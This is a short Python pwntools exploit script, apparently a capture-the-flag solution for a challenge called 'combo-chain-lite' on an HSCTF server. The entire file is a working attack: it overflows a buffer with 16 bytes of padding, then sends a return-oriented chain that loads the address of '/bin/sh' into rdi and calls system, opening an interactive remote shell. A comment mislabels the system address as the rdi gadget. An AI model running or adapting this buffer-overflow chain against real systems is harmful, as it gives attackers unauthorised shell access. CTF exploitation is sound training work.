#!usr/bin/python

from pwn import *
import struct
#p = process('./combo-chain-lite')
p = remote('pwn.hsctf.com', 3131)
offset = 16
payload = 'A'*offset

#Steps find address of pop_rdi, then find address of /bin/sh, then take given address of system

pop_rdi = 0x0000000000401273
system = int(p.recvline().strip().split(': ')[-1],16)
bin_sh = 0x402051

payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)   #address of rdi gadget

p.sendline(payload)
p.recvuntil("!: ")



#gdb.attach(p)

p.interactive()
